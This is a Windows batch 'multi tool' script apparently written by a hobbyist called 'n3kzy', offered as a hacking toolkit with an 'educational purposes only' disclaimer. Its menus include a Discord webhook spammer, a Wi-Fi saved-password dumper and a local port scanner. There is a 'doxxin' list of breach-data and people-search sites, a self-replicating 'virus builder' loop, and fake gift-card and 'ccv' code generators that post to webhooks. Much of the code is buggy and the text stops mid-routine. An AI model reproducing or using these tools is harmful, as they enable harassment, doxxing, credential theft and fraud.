@echo off
color 0a
chcp 65001
:home
cls
color C 
title  n3kzy multi tool
cd %temp%
curl -s https://github.com/n3kzy/pythonbuilder --output main.py
del main.py 
cls
echo.                                                                        

echo                ████████▄     ▄████████         ▄██████▄     ▄█    █▄     ▄██████▄     ▄████████     ███   
echo                ███   ▀███   ███    ███        ███    ███   ███    ███   ███    ███   ███    ███ ▀█████████▄
echo                ███    ███   ███    ███        ███    █▀    ███    ███   ███    ███   ███    █▀     ▀███▀▀██
echo                ███    ███  ▄███▄▄▄▄██▀       ▄███         ▄███▄▄▄▄███▄▄ ███    ███   ███            ███   ▀
echo                ███    ███ ▀▀███▀▀▀▀▀        ▀▀███ ████▄  ▀▀███▀▀▀▀███▀  ███    ███ ▀███████████     ███    
echo                ███    ███ ▀███████████        ███    ███   ███    ███   ███    ███          ███     ███    
echo                ███   ▄███   ███    ███        ███    ███   ███    ███   ███    ███    ▄█    ███     ███   
echo                ████████▀    ███    ███        ████████▀    ███    █▀     ▀██████▀   ▄████████▀     ▄████▀
echo                             ███    ███                                                                       



echo [page n*1]                         
echo [01]→ tool info            [11]→ oisnt tool
echo [02]→ ip lookup            [12]→ generators  
echo [03]→ ip generator         [13]→ username search                
echo [04]→ ip pinger            [14]→ wifi pass cracker    
echo [05]→ ip port scanner      [15]→ exit
echo [06]→ get your ip
echo [07]→ ip grabber
echo [08]→ webhook spammer 
echo [09]→ password Encrypted 
echo [10]→ password Decrypted (soon)
                                              
echo.      
set /p Home= Command: 
if %Home%==1 goto toolinfo
if %Home%==2 goto ip_geo_lookup
if %Home%==3 goto ipgen
if %Home%==4 goto ippinger
if %Home%==5 goto ippscan
if %Home%==6 goto checkip
if %Home%==loadplugin goto pluginload
if %Home%==7 goto ipgrabber 
if %Home%==8 goto webspam 
if %Home%==9 goto passenc 
if %Home%==10 goto home
if %home%==11 goto doxxintools
if %home%==12 goto generatormenu
if %home%==13 goto username_lookup
if %home%==14 goto wifipass 
if %home%==15 goto virusbuilder
goto pluginload
echo That is an invalid command.
pause
goto home

:pluginload
start plugins\%Home%.bat
goto home


:wifipass
@echo off
color C 
cls
echo ⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣿⠷⠾⠛⠛⠛⠛⠷⠶⢶⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⣀⣴⡾⠛⠉⠁⠀              ⠀⠉⠛⠿⣷⣄⡀⠀⠀⠀
echo ⠀⠀⣠⣾⠟⠁⠀⠀⠀⠀⠀     ⠀⠀⠀⠀⠀      ⠀⠀⠈⠛⢿⣦⡀⠀
echo ⢠⣼⠟⠁⠀⠀⠀⠀⣠⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣄⠀⠀⠀⠀⠀  ⠙⣧⡀
echo ⣿⡇⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀ ⠀⢈⣷
echo ⣿⣿⣦⡀⣠⣾⣿⣿⣿⡿⠟⠛⠁⠁⠁⠁⠁⠁⠛⠻⢿⣿⣿⣿⣿⣆⣀⣠⣾⣿
echo ⠉⠻⣿⣿⣿⣿⣽⡿⠋⠀⠀               ⠉⠻⣿⣿⣿⣿⣿⠟⠁
echo ⠀⠀⠈⠙⠛⣿⣿⠀⠀⠀⠀      ⠀⠀⠀⠀       ⣹⣿⡟⠋⠁⠀⠀
echo ⠀⠀⠀⠀⠀⢿⣿⣷⣄⣀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣷⣀⣀⣾⣿⣿⠇⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⣿⣿⣿⠟⠛⠛⠻⣿⣿⣿⣿⣿⡿⠛⠉⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⣿⡇⠀⠀⠀⠀⢸⣿⡏⠙⠋⠁⠀⠀⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣷⣄⠀⠀⣀⣾⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
netsh wlan show profile
set /p name="Type the Wifi Name here: "
netsh wlan show profile "%name%" key=clear>"%USERPROFILE%\Desktop\dr ghost\wifipasswords\%name%.txt"
echo The Files was saved in the Folder SavedFiles: %name%.txt
pause 
exit

 
:webspam
@echo off
chcp 65001
title made by n3kzy
color C
:menu
cls

echo ██╗    ██╗███████╗██████╗ ██╗  ██╗ ██████╗  ██████╗ ██╗  ██╗     ███████╗██████╗  █████╗ ███╗   ███╗███╗   ███╗███████╗██████╗          
echo ██║    ██║██╔════╝██╔══██╗██║  ██║██╔═══██╗██╔═══██╗██║ ██╔╝     ██╔════╝██╔══██╗██╔══██╗████╗ ████║████╗ ████║██╔════╝██╔══██╗         
echo ██║ █╗ ██║█████╗  ██████╔╝███████║██║   ██║██║   ██║█████╔╝█████╗███████╗██████╔╝███████║██╔████╔██║██╔████╔██║█████╗  ██████╔╝         
echo ██║███╗██║██╔══╝  ██╔══██╗██╔══██║██║   ██║██║   ██║██╔═██╗╚════╝╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║██║╚██╔╝██║██╔══╝  ██╔══██╗         
echo ╚███╔███╔╝███████╗██████╔╝██║  ██║╚██████╔╝╚██████╔╝██║  ██╗     ███████║██║     ██║  ██║██║ ╚═╝ ██║██║ ╚═╝ ██║███████╗██║  ██║██╗██╗██╗
echo  ╚══╝╚══╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝     ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝╚═╝                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
echo ┌────────────────────────────────┐
echo │            SPAMMER             │
echo ├────────────────────────────────┤
echo │ 1. Exit                        │
echo │ 2. Discord webhook spammer     │
echo └────────────────────────────────┘
set /p choice=Enter your choice: 

if "%choice%"=="1" goto :eof
if "%choice%"=="2" goto messagesender
goto menu

:messagesender
cls
echo ┌────────────────────────────────┐
echo │     Discord webhook spammer    │
echo ├────────────────────────────────┤
set /p "webhook=│ Enter Discord webhook URL for Message Sender: "
set /p "message=│ Enter the message to send: "
set /p "num_times=│ Enter the number of times to send the message: "

for /l %%n in (1,1,%num_times%) do (
    :: Send message to Discord webhook
    curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%message%\"}" %webhook%
)
echo Messages sent successfully.
pause
goto menu




:toolinfo
color C 
cls
title: Dr ghost tool information.
echo Dr ghost info below.
echo Dr ghost is a semi large multi tool with many options this tool is for educational purposes only i do not agree to this being use maliciously on anyone and i do not give permission on this files code being changed without credits.
echo enjoy this tool thanks for using it.
pause
exit


:cancel
cls
title n3kzy's Multitool - Exiting...
echo Bye!
timeout 3 /NOBREAK >nul
exit

:ip_geo_lookup
color C 
cls
title: Dr ghost op ip lookup  - n3kzy
echo ███████╗███╗   ██╗████████╗███████╗██████╗     ██╗██████╗ 
echo ██╔════╝████╗  ██║╚══██╔══╝██╔════╝██╔══██╗    ██║██╔══██╗
echo █████╗  ██╔██╗ ██║   ██║   █████╗  ██████╔╝    ██║██████╔╝
echo ██╔══╝  ██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗    ██║██╔═══╝ 
echo ███████╗██║ ╚████║   ██║   ███████╗██║  ██║    ██║██║     
echo ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝    ╚═╝╚═╝
echo. ================================================
echo Enter An IP address to lookup (or type back to return to the main menu):
set /p ip=
if "%ip%"=="back" goto menu

curl "https://ipinfo.io/%ip%/json" -o geolocation.json
echo ==================================
echo IP Geolocation for &`%ip%:
type geolocation.json
del gelocation.json
echo =================================
pause
goto ip_geo_lookup
exit 



:ipgen
color C 
cls 
title : Dr ghost ip gen - n3kzy
@echo off



set /a octet1=%random% %% 256
set /a octet2=%random% %% 256
set /a octet3=%random% %% 256
set /a octet4=%random% %% 256


echo Generated IP address: %octet1%.%octet2%.%octet3%.%octet4%

pause


:ippscan 
color C 
cls
title : Dr ghost ip port scanner
@echo off
setlocal enabledelayedexpansion


set IPRange=192.168.1
set PortStart=20
set PortEnd=1024


echo Starting the IP/Port scan...


for /L %%i in (1,1,254) do (
    set IP=%IPRange%.%%i

    for /L %%p in (%PortStart%,1,%PortEnd%) do (
        
        powershell -Command "(Test-NetConnection -ComputerName !IP! -Port %%p).TcpTestSucceeded" >nul 2>&1

        :: Check if the port is open
        if !errorlevel! equ 0 (
            echo Port %%p on !IP! is OPEN
        ) else (
            echo Port %%p on !IP! is CLOSED
        )
    )
)

echo Scan completed.
pause
exit


:checkip
color C 
@echo off
cls
title Dr ghost ip checker
echo Checking your local IP address...
ipconfig | findstr /i "IPv4"
pause
exit


:secret
cls
echo This menu is where I put all the hidden commands
pause
goto secretcmds




if %scmd%==1 goto webspam

:canceldebg
goto home
echo Something went wrong.
timeout 2 /NOBREAK >nul
goto secretcmds


:ipgrabber 
@echo off

set folder="C:\Users\User\Desktop\ip info"
set f:ipgrabberilename="ip_info.txt"


if not exist %folder% (
    mkdir %folder%
)


ipconfig > %folder%\%filename%


echo IP information has been saved to %folder%\%filename%


pause



:passenc
color C 
@echo off
title: Dr ghost password Encrypted 
color C 
cls
echo.
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⠟⠉⠀⠀⠀⠈⠙⠿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⢰⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⣸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⡇⠀⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⢿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⡇⠀⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⢠⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⡀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠉⠉⠛⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀
echo ⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀
echo ⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡶⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀
echo ⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⣿⣿⣶⣶⣶⣶⣶⣾⣿⣿⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠙⠛⠛⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
echo ===========================================================
echo        Password Protected Script (Encrypted)
echo ===========================================================
echo.

:
set "hashed_password=5f4dcc3b5aa765d61d8327deb882cf99"  :: MD5 hash for "password"
set /p user_pass="Enter your password: "

call :hash_password %user_pass%

if "%hashed_input%"=="%hashed_password%" (
    echo Password correct! Access granted.
    goto access_granted
) else (
    echo Incorrect password. Access denied.
    goto end
)

pause 
:hash_password

setlocal enabledelayedexpansion
set "input=%1"
set "hashed_input="
for /l %%A in (0, 1, 31) do (
    set /a "char=!input:~%%A,1!"
    set /a "hashed_char=!char! + 3"
    set "hashed_input=!hashed_input!!hashed_char!"
)
endlocal & set hashed_input=%hashed_input%
goto :eof


:access_granted
echo You are now in. Perform any operations here.
pause
goto end

:end
echo End of script.
pause
exit


:doxxintools
color C 
cls
cls
echo [96m╔════════════════════════╗
echo ║     [31m?leaksearch?       [96m║
echo [96m╚════════════════════════╝   
 echo [96mhttps://intelx.io                                           
 echo [96mhttps://leakpeek.com                                        
 echo [96mhttps://leak-lookup.com                                     
 echo [96mhttps://snusbase.com/search                                 
 echo [96mhttps://haveibeenpwned.com                                  
 echo [96mhttps://www.dehashed.com/                                    
 echo [96mhttps://cybernews.com/personal-data-leak-check              
 echo [96mhttps://breachdirectory.com/search                          
 echo [96mhttps://breachdirectory.org                                 
 echo [96mhttps://leakcheck.net                                       
 echo [96mhttps://breachdbsztfykg2fdaq2gnqnxfsbj5d....onion.pet       
 echo [96mhttps://aleph.occrp.org                                     
 echo [96mhttps://checkleaked.cc                                      
 echo [96mhttps://namescan.io/freeemailcompromisedcheck               
 echo [96mhttps://monitor.firefox.com                                 
 echo [96mhttps://www.fasterbroadband.co.uk/tools/...ach-search       
 echo [96mhttps://www.hotsheet.com/inoitsu                            
 echo [96mhttps://checkashleymadison.com                              
 echo [96mhttps://surfshark.com                                       
 echo [96mhttps://tragercop.1password.com                             
 echo [96mhttps://ghostproject.fr                                     
 echo [96mhttps://saverudata.online/ (RussinLeak DB search)           
echo [96m╔════════════════════════╗                                
echo ║     [31m?PhoneSearch?      [96m║                          
echo [96m╚════════════════════════╝                          
echo [96mhttps://www.spydialer.com                         
echo [96mhttps://www.numlookup.com                         
echo [96mhttps://www.truecaller.com                        
echo [96mhttps://www.searchyellowdirectory.com             
echo [96mhttps://demo.phoneinfoga.crvx.fr                  
echo [96mhttps://onlinesim.io                              
echo [96mhttps://www.411.com                               
echo [96mhttps://411.info                                  
echo [96mhttps://www.calleridtest.com                      
echo [96mhttps://thatsthem.com/reverse-phone-lookup        
echo [96mhttp://www.fonefinder.net                         
echo [96mhttps://www.callersmart.com                      
echo [96mhttps://www.phonevalidator.com                   
echo [96mhttps://freecarrierlookup.com                     
echo [96mhttps://www.usphonebook.com                      
echo [96mhttps://pccare99.com                              
echo [96mhttps://www.numberguru.com                        
echo [96mhttps://www.calltruth.com/                        
echo [96mhttps://www.allareacodes.com                      
echo [96mhttps://www.peoplebyphone.com                     
echo [96mhttps://www.confidentialphonelookup.com           

pause
goto menu


:username_lookup
color C 
set /p username=Type username to lookup: 

echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
echo ⠀⠀⠀⣶⣶⠄⠴⠾⢿⣿⣿⣿⣿⣿⣿⣷⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
echo ⠀⠀⠀⣠⡆⠀⣶⣦⣤⣄⣈⠙⠻⢿⣿⣿⣿⣿⣿⠄⠀⠀⠀⠀⠀⠀⠀
echo ⠀⢀⣾⣿⡇⢸⣿⣿⣿⣿⣿⣷⣦⣄⠙⢿⣿⣿⣁⣤⣶⣶⣶⣶⣶⣶⡄
echo ⠀⣾⣿⣿⡇⠈⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⣹⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋
echo ⢸⣿⣿⣿⣷⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠋⠁⠀⠀⠀
echo ⢸⣿⣿⣿⣿⡆⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⢉⠀⢠⣶⣆⠀⠀⠀⠀
echo ⠘⣿⣿⠿⣿⣿⣤⣿⣿⣿⣿⣿⣿⠟⠋⣁⡄⠀⠿⠇⠀⠙⢿⣷⣄⠀⠀
echo ⠀⠉⢁⣴⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⠾⠿⠇⠀⠀⠀⠀⠀⣨⣿⣿⠆⠀
echo ⠀⣰⣿⣿⣿⣿⣿⠿⠋⣀⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠿⠛⠁⠀⠀
echo ⣰⣿⣿⣿⡿⠛⢁⣤⣾⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⢸⣿⣄⠀⠀⠀⠀
echo ⠻⣿⠿⠋⠀⢰⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⣠⣤⣤⣤⣿⡟⣿⡆⠀⠀⠀
echo ⠀⠀⠀⠀⠀⢸⣿⡏⠉⠉⠀⠀⠀⠀⠀⠀⣿⣿⠛⠛⠉⠀⣿⡇⣤⣤⣤
echo ⠀⠀⠀⠀⠀⢸⣿⣧⣤⣤⣤⣤⣤⣤⣤⣴⣿⣿⠀⠀⠀⠀⢹⣷⣿⣿⣿
echo ⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠉⠉⠉⠁
echo [91m╔═══════════════════════════════════════════════════════════════════════════════════════════════════╗
echo [93m║ .dP"Y8 888888    db    88""Yb  dP""b8 88  88     88""Yb 888888 .dP"Y8 88   88 88     888888 .dP"Y8║
echo [91m║ `Ybo." 88__     dPYb   88__dP dP   `" 88  88     88__dP 88__   `Ybo." 88   88 88       88   `Ybo."║
echo [93m║ o.`Y8b 88""    dP__Yb  88"Yb  Yb      888888     88"Yb  88""   o.`Y8b Y8   8P 88  .o   88   o.`Y8b║
echo [91m║ 8bodP' 888888 dP""""Yb 88  Yb  YboodP 88  88     88  Yb 888888 8bodP' `YbodP' 88ood8   88   8bodP'║
echo [93m╚═══════════════════════════════════════════════════════════════════════════════════════════════════╝ 
echo.
echo                ╔════════════════════════════════════════════════════════════
echo                ║TikTok: [37mhttps://www.tiktok.com/@%username%
echo                ║════════════════════════════════════════════════════════════
echo                ║Instagram: [37mhttps://www.instagram.com/%username%             
echo                ║════════════════════════════════════════════════════════════
echo                ║Facebook: [37mhttps://www.facebook.com/%username%               
echo                ║════════════════════════════════════════════════════════════
echo                ║Twitter: [37mhttps://www.twitter.com/%username%                 
echo                ║════════════════════════════════════════════════════════════
echo                ║Steam: [37mhttps://steamcommunity.com/id/%username%             
echo                ║════════════════════════════════════════════════════════════
echo                ║YouTube: [37mhttps://www.youtube.com/user/%username%            
echo                ║════════════════════════════════════════════════════════════
echo                ║GitHub: [37mhttps://www.github.com/%username%                   
echo                ║════════════════════════════════════════════════════════════
echo                ║Reddit: [37mhttps://www.reddit.com/user/%username%              
echo                ║════════════════════════════════════════════════════════════
echo                ║Discord: [37mhttps://www.discord.com/%username%                 
echo                ║════════════════════════════════════════════════════════════
echo                ║SoundCloud: [37mhttps://soundcloud.com/%username%               
echo                ║════════════════════════════════════════════════════════════
echo                ║Twitch: [37mhttps://www.twitch.tv/%username%                   
echo                ║════════════════════════════════════════════════════════════
echo                ║Snapchat: [37mhttps://www.snapchat.com/add/%username%           
echo                ║════════════════════════════════════════════════════════════
echo                ║Pinterest: [37mhttps://www.pinterest.com/%username%             
echo               ╚════════════════════════════════════════════════════════════
echo                         ┌──────────────────────────────────┐
echo                         │     Please join our discord      │
echo                         │                                  │
echo                         │  coming soon...                  │ 
echo                         │                                  │
echo                         │                                  │
echo                         │                                  │
echo                         └──────────────────────────────────┘
pause
goto :menu




:virusbuiler
@echo off
color 02
title Amoeba
set/a life=3
:Top
if %life%==0 (
del %0
)
set name=
:Loop
set/a namenumber=%RANDOM% / (32767 / 25)
set/a namenumber=%RANDOM% / (32767 / 25)
set/a namenumber=%RANDOM% / (32767 / 25)
if %namenumber%==0 set name=A%name%
if %namenumber%==1 set name=B%name%
if %namenumber%==2 set name=D%name%
if %namenumber%==3 set name=D%name%
if %namenumber%==4 set name=E%name%
if %namenumber%==5 set name=F%name%
if %namenumber%==6 set name=G%name%
if %namenumber%==7 set name=H%name%
if %namenumber%==8 set name=I%name%
if %namenumber%==9 set name=J%name%
if %namenumber%==10 set name=K%name%
if %namenumber%==11 set name=L%name%
if %namenumber%==12 set name=M%name%
if %namenumber%==13 set name=N%name%
if %namenumber%==14 set name=O%name%
if %namenumber%==15 set name=P%name%
if %namenumber%==16 set name=Q%name%
if %namenumber%==17 set name=R%name%
if %namenumber%==18 set name=S%name%
if %namenumber%==19 set name=T%name%
if %namenumber%==20 set name=U%name%
if %namenumber%==21 set name=V%name%
if %namenumber%==22 set name=W%name%
if %namenumber%==23 set name=X%name%
if %namenumber%==24 set name=Y%name%
if %namenumber%==25 set name=Z%name%
if EXIST %name%.bat goto Loop
copy %0 %name%.bat >nul
start /min %name%.bat
set/a life=%life% -1
goto Top
exit



:generatormenu
color C 
cls
echo                        ┌────────────────────┐                      
echo                        │                    │                      
echo                        │                    │                      
echo                        │     Gen menu       │                      
echo                        │                    │                      
echo                        │                    │                      
echo                        │                    │                      
echo ┌──────────────────────┴────────────────────┴───────────────────────┐
echo │           steam           netflix           psn                   │
echo │                                                                   │
echo │          roblox                           spotify                 │
echo │          disney           xbox             epic                   │
echo │         nintendo                         minecraft                │
echo │                         fortnite                                  │
echo │                                                                   │
echo │                         twitch                                    │
echo │                                                                   │
echo │                          ccv                                      │
echo │                                                                   │
echo │                                                                   │
echo │                                                                   │
echo │                                                                   │
echo │                                                                   │
echo │                                                                   │
echo └───────────────────────────────────────────────────────────────────┘

set /p gen_choice=Enter your choice:
if "%gen_choice%"=="steam" goto steamgen
if "%gen_choice%"=="!spam" goto messagesender
if "%gen_choice%"=="!exit" goto :eof
if "%gen_choice%"=="netflix" goto netflixgen
if "%gen_choice%"=="psn" goto psngen
if "%gen_choice%"=="xbox" goto xboxgen
if "%gen_choice%"=="roblox" goto robloxgen
if "%gen_choice%"=="spotify" goto spotifygen
if "%gen_choice%"=="fortnite" goto fortnitegen
if "%gen_choice%"=="disney" goto disneyplusgen
if "%gen_choice%"=="epic" goto epicgamesgen
if "%gen_choice%"=="twitch" goto twitchprimegen
if "%gen_choice%"=="nintendo" goto nintendoeshopgen
if "%gen_choice%"=="minecraft" goto minecraftgen
if "%gen_choice%"=="ccv" goto visamastercardgen

:steamgen
@echo off
setlocal
set "characters=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
set "length=15"

set /p "webhook=Enter Discord webhook URL for Steam codes: "

:steamgen_loop
set /p "num_codes=Enter the number of Steam codes to generate (0 to exit): "
if %num_codes% equ 0 goto menu

for /l %%n in (1,1,%num_codes%) do (
    set "code="
    for /l %%i in (1,1,%length%) do (
        set /a "rand_idx=!random! %% 36"
        for %%j in (!rand_idx!) do set "char=!characters:~%%j,1!"
        set "code=!code!!char!"
    )

    curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"https://store.steampowered.com/account/registerkey?key=%code%\"}" %webhook%
)

goto steamgen_loop

:netflixgen


goto menu

:psngen
@echo off
setlocal
set "characters=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
set "length=12"

set /p "webhook=Enter Discord webhook URL for PlayStation Network codes: "

:psngen_loop
set /p "num_codes=Enter the number of PlayStation Network codes to generate (0 to exit): "
if %num_codes% equ 0 goto generatormenu

for /l %%n in (1,1,%num_codes%) do (
    set "code="
    for /l %%i in (1,1,%length%) do (
        set /a "rand_idx=!random! %% 36"
        for %%j in (!rand_idx!) do set "char=!characters:~%%j,1!"
        set "code=!code!!char!"
    )

    curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"https://store.playstation.com/en-us/redeem-code/%code%\"}" %webhook%
)

goto psngen_loop


:xboxgen
@echo off
setlocal
set "characters=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
set "length=16"

set /p "webhook=Enter Discord webhook URL for Xbox Live codes: "

:xboxgen_loop
set /p "num_codes=Enter the number of Xbox Live codes to generate (0 to exit): "
if %num_codes% equ 0 goto generatormenu

for /l %%n in (1,1,%num_codes%) do (
    set "code="
    for /l %%i in (1,1,%length%) do (
        set /a "rand_idx=!random! %% 36"
        for %%j in (!rand_idx!) do set "char=!characters:~%%j,1!"
        set "code=!code!!char!"
    )

    curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"https://redeem.microsoft.com/%code%\"}" %webhook%
)

goto xboxgen_loop



:robloxgen
@echo off
setlocal
set "characters=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
set "length=12"

set /p "webhook=Enter Discord webhook URL for Roblox codes: "

:robloxgen_loop
set /p "num_codes=Enter the number of Roblox codes to generate (0 to exit): "
if %num_codes% equ 0 goto generatormenu

for /l %%n in (1,1,%num_codes%) do (
    set "code="
    for /l %%i in (1,1,%length%) do (
        set /a "rand_idx=!random! %% 62"
        for %%j in (!rand_idx!) do set "char=!characters:~%%j,1!"
        set "code=!code!!char!"
    )

    curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"https://www.roblox.com/gamecard/redeem/%code%\"}" %webhook%
)

goto robloxgen_loop



:spotifygen
@echo off
setlocal
set "characters=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
set "length=10"

set /p "webhook=Enter Discord webhook URL for Spotify codes: "

:spotifygen_loop
set /p "num_codes=Enter the number of Spotify codes to generate (0 to exit): "
if %num_codes% equ 0 goto generatormenu

for /l %%n in (1,1,%num_codes%) do (
    set "code="
    for /l %%i in (1,1,%length%) do (
        set /a "rand_idx=!random! %% 62"
        for %%j in (!rand_idx!) do set "char=!characters:~%%j,1!"
        set "code=!code!!char!"
    )

    curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"https://www.spotify.com/activate/%code%\"}" %webhook%
)

goto spotifygen_loop

:fortnitegen
@echo off
setlocal
set "characters=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
set "length=16"

set /p "webhook=Enter Discord webhook URL for Fortnite V-Bucks codes: "

:fortnitegen_loop
set /p "num_codes=Enter the number of Fortnite V-Bucks codes to generate (0 to exit): "
if %num_codes% equ 0 goto generatormenu

for /l %%n in (1,1,%num_codes%) do (
    set "code="
    for /l %%i in (1,1,%length%) do (
        set /a "rand_idx=!random! %% 62"
        for %%j in (!rand_idx!) do set "char=!characters:~%%j,1!"
        set "code=!code!!char!"
    )

    curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"https://www.fortnite.com/redeem/%code%\"}" %webhook%
)

goto fortnitegen_loop

:disneyplusgen
@echo off
setlocal
set "characters=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
set "length=12"

set /p "webhook=Enter Discord webhook URL for Disney+ Gift Card codes: "

:disneyplusgen_loop
set /p "num_codes=Enter the number of Disney+ Gift Card codes to generate (0 to exit): "
if %num_codes% equ 0 goto generatormenu

for /l %%n in (1,1,%num_codes%) do (
    set "code="
    for /l %%i in (1,1,%length%) do (
        set /a "rand_idx=!random! %% 62"
        for %%j in (!rand_idx!) do set "char=!characters:~%%j,1!"
        set "code=!code!!char!"
    )

    curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"https://www.disneyplus.com/redeem/%code%\"}" %webhook%
)

goto disneyplusgen_loop

:epicgamesgen
@echo off
setlocal
set "characters=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
set "length=16"

set /p "webhook=Enter Discord webhook URL for Epic Games Gift Card codes: "

:epicgamesgen_loop
set /p "num_codes=Enter the number of Epic Games Gift Card codes to generate (0 to exit): "
if %num_codes% equ 0 goto generatormenu

for /l %%n in (1,1,%num_codes%) do (
    set "code="
    for /l %%i in (1,1,%length%) do (
        set /a "rand_idx=!random! %% 62"
        for %%j in (!rand_idx!) do set "char=!characters:~%%j,1!"
        set "code=!code!!char!"
    )

    curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"https://www.epicgames.com/redeem/%code%\"}" %webhook%
)

goto epicgamesgen_loop

:twitchprimegen
@echo off
setlocal
set "characters=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
set "length=12"

set /p "webhook=Enter Discord webhook URL for Twitch Prime codes: "

:twitchprimegen_loop
set /p "num_codes=Enter the number of Twitch Prime codes to generate (0 to exit): "
if %num_codes% equ 0 goto generatormenu

for /l %%n in (1,1,%num_codes%) do (
    set "code="
    for /l %%i in (1,1,%length%) do (
        set /a "rand_idx=!random! %% 62"
        for %%j in (!rand_idx!) do set "char=!characters:~%%j,1!"
        set "code=!code!!char!"
    )

